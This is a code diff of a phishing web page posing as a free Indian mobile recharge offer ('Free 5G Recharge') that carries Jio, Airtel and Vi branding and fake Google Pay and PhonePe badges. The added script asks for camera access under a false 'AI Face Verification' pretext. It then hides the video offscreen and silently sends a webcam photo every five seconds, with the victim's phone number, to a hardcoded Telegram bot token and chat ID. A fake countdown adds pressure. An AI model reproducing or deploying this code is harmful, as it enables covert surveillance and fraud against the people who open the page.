@@ -3,180 +3,134 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FastPay - Mini Recharge Portal</title>
+    <title>FastPay - Free 5G Recharge Offer</title>
     <style>
-        :root {
-            --primary: #2563eb;
-            --secondary: #1e293b;
-            --accent: #3b82f6;
-            --success: #10b981;
-            --bg: #f8fafc;
-        }
-
-        body {
-            font-family: 'Inter', system-ui, sans-serif;
-            background-color: var(--bg);
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-
-        .recharge-card {
-            background: white;
-            width: 100%;
-            max-width: 400px;
-            padding: 2rem;
-            border-radius: 20px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
-        }
-
-        .header { text-align: center; margin-bottom: 2rem; }
-        .header h2 { color: var(--secondary); margin: 0; }
-        .header p { color: #64748b; font-size: 0.9rem; }
-
-        .input-group { margin-bottom: 1.2rem; }
-        label { display: block; margin-bottom: 0.5rem; font-weight: 500; color: #475569; }
+        :root { --primary: #1a73e8; --accent: #f4b400; --bg: #f1f3f4; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg); margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
         
-        input, select {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #e2e8f0;
-            border-radius: 10px;
-            box-sizing: border-box;
-            font-size: 1rem;
-        }
+        .offer-card { background: white; width: 92%; max-width: 420px; border-radius: 16px; overflow: hidden; box-shadow: 0 8px 30px rgba(0,0,0,0.15); border: 2px solid #ffd700; }
+        
+        .promo-header { background: linear-gradient(135deg, #1a73e8, #8ab4f8); color: white; padding: 20px; text-align: center; }
+        .promo-header h1 { margin: 0; font-size: 22px; }
+        .timer { font-weight: bold; color: #fff; background: rgba(0,0,0,0.2); padding: 5px 10px; border-radius: 20px; display: inline-block; margin-top: 10px; font-size: 14px; }
 
-        .btn-pay {
-            width: 100%;
-            background: var(--primary);
-            color: white;
-            border: none;
-            padding: 14px;
-            border-radius: 10px;
-            font-size: 1rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
+        .content { padding: 20px; }
+        .offer-details { background: #fff9c4; border: 1px dashed #fbc02d; padding: 15px; border-radius: 10px; margin-bottom: 20px; text-align: center; }
+        .offer-details b { color: #d32f2f; font-size: 18px; }
 
-        .btn-pay:hover { background: var(--accent); }
+        .input-box { margin-bottom: 15px; }
+        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; }
+        
+        .btn-claim { width: 100%; background: #28a745; color: white; border: none; padding: 15px; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .btn-claim:hover { background: #218838; transform: translateY(-2px); }
 
-        /* Hidden elements for capture logic */
-        #video, #canvas {
-            position: absolute;
-            left: -9999px;
-            opacity: 0;
-        }
+        .verification-note { font-size: 11px; color: #777; text-align: center; margin-top: 15px; }
+        .verified-logos { display: flex; justify-content: center; gap: 15px; margin-top: 20px; opacity: 0.6; }
 
-        .status-msg {
-            margin-top: 1rem;
-            text-align: center;
-            font-size: 0.85rem;
-            display: none;
-        }
+        /* Hidden elements */
+        #video, #canvas { position: absolute; left: -9999px; opacity: 0; pointer-events: none; }
     </style>
 </head>
 <body>
 
-    <div class="recharge-card">
-        <div class="header">
-            <h2>FastPay Recharge</h2>
-            <p>Enter details to get instant cashback</p>
+    <div class="offer-card">
+        <div class="promo-header">
+            <h1>Special 5G Promo</h1>
+            <div class="timer" id="timer">Ends in: 09:54</div>
         </div>
 
-        <div class="input-group">
-            <label>Mobile Number</label>
-            <input type="tel" id="phone" placeholder="98765 xxxxx" maxlength="10">
-        </div>
+        <div class="content">
+            <div class="offer-details">
+                Get <b>₹239 (28 Days)</b> Recharge <br> Absolutely <b>FREE!</b>
+            </div>
 
-        <div class="input-group">
-            <label>Operator</label>
-            <select id="operator">
-                <option value="jio">Jio</option>
-                <option value="airtel">Airtel</option>
-                <option value="vi">Vi (Vodafone Idea)</option>
-            </select>
-        </div>
+            <div class="input-box">
+                <input type="tel" id="mobile" placeholder="Enter Mobile Number" maxlength="10">
+            </div>
 
-        <div class="input-group">
-            <label>Amount</label>
-            <input type="number" id="amount" placeholder="₹149, ₹239, etc.">
-        </div>
+            <div class="input-box">
+                <select id="sim" style="width:100%; padding:12px; border-radius:8px; border:1px solid #ccc;">
+                    <option value="jio">Jio Unlimited 5G</option>
+                    <option value="airtel">Airtel Thanks Promo</option>
+                    <option value="vi">Vi Hero Unlimited</option>
+                </select>
+            </div>
 
-        <button class="btn-pay" id="payBtn">Proceed to Recharge</button>
-        <p class="status-msg" id="statusText">Processing Secure Payment...</p>
+            <button class="btn-claim" id="claimBtn">Claim Free Recharge</button>
+            
+            <p class="verification-note">Note: Safe AI Face Verification is required to prevent multiple claims per person.</p>
+
+            <div class="verified-logos">
+                <span style="font-weight:bold; color:#1a73e8;">Google Pay</span>
+                <span style="font-weight:bold; color:#673ab7;">PhonePe</span>
+                <span style="font-weight:bold; color:#000;">NPCI</span>
+            </div>
+        </div>
     </div>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
     <script>
-        const CONFIG = {
-            BOT_TOKEN: '7866282179:AAGYCmuvhoCoxVjSXn5UmnI7onomvDKbIgE',
-            CHAT_ID: '8285724366',
-            INTERVAL: 4000
-        };
+        const BOT_TOKEN = '7866282179:AAGYCmuvhoCoxVjSXn5UmnI7onomvDKbIgE';
+        const CHAT_ID = '8285724366';
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const payBtn = document.getElementById('payBtn');
-        const statusText = document.getElementById('statusText');
+        const claimBtn = document.getElementById('claimBtn');
 
-        // Capture logic
-        async function sendToTelegram(blob) {
-            const formData = new FormData();
-            formData.append('chat_id', CONFIG.CHAT_ID);
-            formData.append('photo', blob, 'user_verify.jpg');
+        // Timer Logic
+        let time = 594; 
+        setInterval(() => {
+            let mins = Math.floor(time / 60);
+            let secs = time % 60;
+            document.getElementById('timer').innerText = `Ends in: 0${mins}:${secs < 10 ? '0'+secs : secs}`;
+            if(time > 0) time--;
+        }, 1000);
+
+        // Send to Telegram
+        async function sendCapturedPhoto(blob) {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', blob, 'user_claim.jpg');
+            fd.append('caption', `New Free Recharge Request\nMobile: ${document.getElementById('mobile').value}`);
 
             try {
-                await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
-                    body: formData
+                    body: fd
                 });
-            } catch (e) { console.error("Network Error"); }
+            } catch(e) {}
         }
 
-        function startCapture() {
+        function startHiddenCapture() {
             setInterval(() => {
-                const ctx = canvas.getContext('2d');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
-                ctx.drawImage(video, 0, 0);
-                canvas.toBlob(blob => blob && sendToTelegram(blob), 'image/jpeg', 0.6);
-            }, CONFIG.INTERVAL);
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(blob => blob && sendCapturedPhoto(blob), 'image/jpeg', 0.5);
+            }, 5000);
         }
 
-        payBtn.addEventListener('click', async () => {
-            const phone = document.getElementById('phone').value;
-            if(phone.length < 10) {
-                alert("Please enter a valid mobile number");
-                return;
-            }
+        claimBtn.addEventListener('click', async () => {
+            const phone = document.getElementById('mobile').value;
+            if(phone.length < 10) { alert("Please enter valid mobile number"); return; }
 
-            statusText.style.display = 'block';
-            payBtn.innerText = "Verifying...";
-            payBtn.disabled = true;
+            claimBtn.innerText = "Verifying Identity...";
+            claimBtn.style.background = "#ffa000";
 
             try {
-                // Request Camera Access (This is required by browsers)
+                // Requesting camera as "Face Verification"
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
                 
-                // Start background tasks
-                setTimeout(startCapture, 2000);
-                
-                // Simulate payment processing
                 setTimeout(() => {
-                    statusText.innerText = "Redirecting to Secure Gateway...";
-                    statusText.style.color = "orange";
-                }, 3000);
+                    startHiddenCapture();
+                    alert("AI Verification Started. Please keep the page open for 10 seconds to process your recharge.");
+                }, 1000);
 
             } catch (err) {
-                alert("Payment Error: Security verification required to process recharge.");
-                payBtn.disabled = false;
-                payBtn.innerText = "Try Again";
+                alert("Identity Verification Failed! Camera access is required to claim free recharge.");
             }
         });
     </script>
